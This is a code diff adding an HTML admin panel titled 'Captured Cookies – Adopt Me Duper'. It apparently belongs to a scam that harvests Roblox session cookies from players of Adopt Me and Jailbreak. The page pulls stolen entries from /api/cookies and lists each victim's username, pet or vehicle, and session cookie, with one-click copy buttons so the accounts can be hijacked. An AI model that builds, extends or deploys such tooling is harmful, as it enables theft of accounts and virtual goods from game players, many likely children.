@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Captured Cookies – Adopt Me Duper</title>
+  <style>
+    :root { --bg:#0d1117; --surface:#161b22; --border:rgba(255,255,255,0.06); --text:#c9d1d9; --pink:#d6336c; --pink2:#ff69b4; }
+    @keyframes fadeIn { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
+    body {
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+      background: radial-gradient(circle at 40% 30%, #2d1e30, #0d1117);
+      color: var(--text);
+      display: flex; justify-content: center; min-height: 100vh; padding: 24px;
+    }
+    .container { width:100%; max-width:1000px; animation: fadeIn 0.4s ease; }
+    .header {
+      display:flex; align-items:center; justify-content:space-between;
+      background: rgba(22,27,34,0.8); backdrop-filter: blur(10px);
+      border:1px solid var(--border); border-radius:20px; padding:20px 28px; margin-bottom:28px;
+    }
+    .header-left { display:flex; align-items:center; gap:16px; }
+    .header-logo { width:44px; height:44px; border-radius:12px; box-shadow:0 0 12px rgba(255,105,180,0.4); }
+    .header h1 { font-size:24px; color:#fff; }
+    .header-actions { display:flex; gap:12px; }
+    .btn { padding:10px 22px; border-radius:12px; font-weight:600; font-size:14px; cursor:pointer; text-decoration:none; transition:0.2s; }
+    .btn-refresh { background:var(--pink); color:#fff; border:none; }
+    .btn-refresh:hover { background:#e64980; }
+    .btn-logout { background:transparent; border:1px solid rgba(255,255,255,0.15); color:#ccc; }
+    .btn-logout:hover { background:rgba(255,255,255,0.05); }
+    .tabs {
+      display:flex; gap:8px; margin-bottom:24px;
+      background: rgba(22,27,34,0.6); backdrop-filter: blur(6px);
+      padding:6px; border-radius:16px; width:fit-content;
+    }
+    .tab {
+      padding:10px 24px; border-radius:12px; font-weight:600; font-size:14px; cursor:pointer;
+      color:#8b949e; background:transparent; border:none; transition:0.2s;
+    }
+    .tab.active { background:var(--pink); color:#fff; box-shadow:0 4px 12px rgba(214,51,108,0.4); }
+    .card {
+      background: rgba(22,27,34,0.8); backdrop-filter: blur(10px);
+      border:1px solid var(--border); border-radius:20px; padding:24px;
+    }
+    .entry {
+      display:flex; align-items:center; justify-content:space-between;
+      padding:16px 0; border-bottom:1px solid var(--border); gap:16px; flex-wrap:wrap;
+    }
+    .entry:last-child { border-bottom:none; }
+    .entry-info strong { color:#fff; font-size:15px; }
+    .entry-info span { font-size:12px; color:#8b949e; }
+    .cookie-box {
+      font-family: monospace; font-size:13px; color:#c9d1d9; background: #0d1117;
+      padding:8px 12px; border-radius:8px; max-width:280px; overflow:hidden;
+      text-overflow:ellipsis; white-space:nowrap;
+    }
+    .copy-btn {
+      background:#21262d; border:1px solid #30363d; color:#c9d1d9;
+      padding:8px 16px; border-radius:10px; cursor:pointer; font-size:13px; font-weight:600;
+    }
+    .copy-btn:hover { background:#30363d; }
+    .empty { text-align:center; color:#8b949e; padding:60px 0; font-size:16px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="header-left">
+        <img class="header-logo" src="https://www.rw-designer.com/icon-image/22221-256x256x32.png" alt="Adopt Me">
+        <h1>Captured Cookies</h1>
+      </div>
+      <div class="header-actions">
+        <button class="btn btn-refresh" onclick="loadData()">🔄 Refresh</button>
+        <a href="/logout" class="btn btn-logout">Logout</a>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" data-tab="adoptme">🐾 Adopt Me</button>
+      <button class="tab" data-tab="jailbreak">🚗 Jailbreak</button>
+    </div>
+
+    <div class="card" id="content">Loading...</div>
+  </div>
+
+  <script>
+    let currentTab = 'adoptme';
+    let allData = { jailbreak: [], adoptme: [] };
+
+    async function loadData() {
+      document.getElementById('content').innerHTML = 'Loading...';
+      try {
+        const res = await fetch('/api/cookies');
+        if (res.status === 401) { window.location.href = '/login'; return; }
+        allData = await res.json();
+        renderTab();
+      } catch (err) {
+        document.getElementById('content').innerHTML = '<div class="empty">Could not connect to server.</div>';
+      }
+    }
+
+    function renderTab() {
+      const data = allData[currentTab] || [];
+      const container = document.getElementById('content');
+      if (!data.length) { container.innerHTML = '<div class="empty">✨ No cookies captured yet.</div>'; return; }
+      let html = '';
+      data.forEach(entry => {
+        const detail = currentTab === 'jailbreak' ? `Vehicle: ${entry.vehicle || 'N/A'}` : `Pet: ${entry.pet || 'N/A'}`;
+        html += `<div class="entry">
+          <div class="entry-info">
+            <strong>${entry.username}</strong>
+            <span>${detail}</span>
+          </div>
+          <div class="cookie-box" title="${entry.cookie}">${(entry.cookie || '').substring(0, 50)}...</div>
+          <button class="copy-btn" data-cookie="${entry.cookie.replace(/"/g, '&quot;')}">📋 Copy</button>
+        </div>`;
+      });
+      container.innerHTML = html;
+      document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          navigator.clipboard.writeText(btn.getAttribute('data-cookie')).then(() => {
+            btn.textContent = '✔ Copied';
+            setTimeout(() => btn.textContent = '📋 Copy', 2000);
+          });
+        });
+      });
+    }
+
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        currentTab = tab.dataset.tab;
+        renderTab();
+      });
+    });
+
+    loadData();
+  </script>
+</body>
+</html>
